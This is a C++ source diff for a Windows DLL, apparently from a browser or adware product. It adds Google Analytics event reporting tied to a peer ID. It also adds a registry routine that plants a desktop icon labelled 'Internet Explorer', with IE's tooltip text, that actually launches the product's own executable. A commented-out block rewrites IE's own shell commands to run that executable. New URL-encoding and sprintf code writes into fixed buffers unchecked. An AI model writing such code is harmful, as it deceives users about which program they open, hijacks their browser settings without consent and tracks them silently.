@@ -251,7 +251,7 @@ extern "C" __declspec(dllexport) void SendAnyHttpStat(CHAR *ec,CHAR *ea, CHAR *e
 	//SendHttpStatThread((LPVOID)szURL);
 }
 
-extern "C" __declspec(dllexport) void SendAnyHttpStatIE(CHAR *ec,CHAR *ea, CHAR *el,long ev)
+extern "C" __declspec(dllexport) void SendAnyHttpStatIE(CHAR *ec,CHAR *ea, CHAR *el,long ev, CHAR* tid = "UA-61921868-1")
 {
 	if (ec == NULL || ea == NULL)
 	{
@@ -275,7 +275,41 @@ extern "C" __declspec(dllexport) void SendAnyHttpStatIE(CHAR *ec,CHAR *ea, CHAR 
 		sprintf(szev, "&ev=%ld",ev);
 		str += szev;
 	}
-	sprintf(szURL, "http://www.google-analytics.com/collect?v=1&tid=UA-60726208-1&cid=%s&t=event&ec=%s&ea=%s%s",szPid,ec,ea,str.c_str());
+	sprintf(szURL, "http://www.google-analytics.com/collect?v=1&tid=%s&cid=%s&t=event&ec=%s&ea=%s%s",tid, szPid,ec,ea,str.c_str());
+
+	ResetUserHandle();
+	DWORD dwThreadId = 0;
+	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
+	CloseHandle(hThread);
+	//SendHttpStatThread((LPVOID)szURL);
+}
+
+//ie独立包的上报
+extern "C" __declspec(dllexport) void SendAnyHttpStatIESelf(CHAR *ec,CHAR *ea, CHAR *el,long ev)
+{
+	if (ec == NULL || ea == NULL)
+	{
+		return ;
+	}
+	//TSAUTO();
+	CHAR* szURL = new CHAR[MAX_PATH];
+	memset(szURL, 0, MAX_PATH);
+	char szPid[256] = {0};
+	extern void GetPeerID(CHAR * pszPeerID);
+	GetPeerID(szPid);
+	std::string str = "";
+	if (el != NULL )
+	{
+		str += "&el=";
+		str += el;
+	}
+	if (ev != 0)
+	{
+		CHAR szev[MAX_PATH] = {0};
+		sprintf(szev, "&ev=%ld",ev);
+		str += szev;
+	}
+	sprintf(szURL, "http://www.google-analytics.com/collect?v=1&tid=UA-61742876-1&cid=%s&t=event&ec=%s&ea=%s%s",szPid,ec,ea,str.c_str());
 
 	ResetUserHandle();
 	DWORD dwThreadId = 0;
@@ -769,11 +803,46 @@ extern "C" __declspec(dllexport) void HideIEIcon(int value)
 
 extern "C" __declspec(dllexport) void ReplaceIcon(const char* strExePath)
 {
+
+	/*HKEY hKEY;
+	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_CLASSES_ROOT, "CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\shell\\NoAddOns\\Command",0,KEY_ALL_ACCESS,&hKEY))
+	{
+		char szValue[256] = {0};
+		DWORD dwSize = sizeof(szValue);
+		DWORD dwType = REG_SZ;
+		if(::RegQueryValueExA(hKEY, "", 0, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS && ERROR_SUCCESS == ::RegSetValueExA(hKEY, "", 0, REG_SZ, (const BYTE*)strExePath, strlen(strExePath)+1))
+		{
+			SetRegValue(HKEY_CURRENT_USER, "SOFTWARE\\iexplorer", "HideIEIcon_NoAddOns", szValue);
+			::RegCloseKey(hKEY);
+		}
+	}
+	HKEY hKEY2;
+	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_CLASSES_ROOT, "CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\shell\\OpenHomePage\\Command",0,KEY_ALL_ACCESS,&hKEY2))
+	{
+		char szValue[256] = {0};
+		DWORD dwSize = sizeof(szValue);
+		DWORD dwType = REG_SZ;
+		if(::RegQueryValueExA(hKEY2, "", 0, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS && ERROR_SUCCESS == ::RegSetValueExA(hKEY2, "", 0, REG_SZ, (const BYTE*)strExePath, strlen(strExePath)+1))
+		{
+			SetRegValue(HKEY_CURRENT_USER, "SOFTWARE\\iexplorer", "HideIEIcon_OpenHomePage", szValue);
+			::RegCloseKey(hKEY2);
+		}
+	}
+	
+	return;//20150409 add TODO:修改ie的注册表*/
+	HKEY hKEY;
+	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}",0,KEY_READ,&hKEY))
+	{
+		//已经存在则不写
+		return;
+	}
+	char strCommand[MAX_PATH] = {0};
+	sprintf(strCommand, "\"%s\" /sstartfrom desktopnamespace", strExePath);
 	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}", "InfoTip", "查找并显示 Iternet 上的信息和网站。");
 	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}", "LocalizedString", "Internet Explorer");
 	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon", "", strExePath);
 	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open", "", "打开主页(&H)");
-	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command", "", strExePath);
+	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command", "", strCommand);
 	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop", "", "属性(&R)");
 	SetRegValue(HKEY_CLASSES_ROOT, "CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command", "", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl");
 	SetRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}", "", "Internet Exploer");
@@ -797,7 +866,6 @@ extern "C" __declspec(dllexport) int IsOsUac()
 HANDLE hThreadINI;
 void GetFileVersionString(const char* utf8FilePath, char* szRet)
 {
-
 	DWORD dwHandle = 0;
 	DWORD dwSize = ::GetFileVersionInfoSizeA(utf8FilePath, &dwHandle);
 	std::string utf8Version;
@@ -1001,3 +1069,31 @@ extern "C" __declspec(dllexport) int WaitINI(int nNotCheck = 0)
 
 }
 
+//http://blog.csdn.net/gemo/article/details/8468311
+unsigned char ToHex(unsigned char x) 
+{ 
+    return  x > 9 ? x + 55 : x + 48; 
+}
+
+extern "C" __declspec(dllexport) void UrlEncode(const char* strSource, char* strOutput)
+{
+	memset(strOutput, 0, MAX_PATH);
+    size_t length = strlen(strSource);
+    for (size_t i = 0; i < length; i++)
+    {
+        if (isalnum((unsigned char)strSource[i]) || 
+            (strSource[i] == '-') ||
+            (strSource[i] == '_') || 
+            (strSource[i] == '.') || 
+            (strSource[i] == '~'))
+           strOutput[strlen(strOutput)] = strSource[i];
+        else if (strSource[i] == ' ')
+            strcat(strOutput, "+");
+        else
+        {
+			strOutput[strlen(strOutput)] = '%';
+            strOutput[strlen(strOutput)] = ToHex((unsigned char)strSource[i] >> 4);
+            strOutput[strlen(strOutput)] = ToHex((unsigned char)strSource[i] % 16);
+        }
+    }
+}
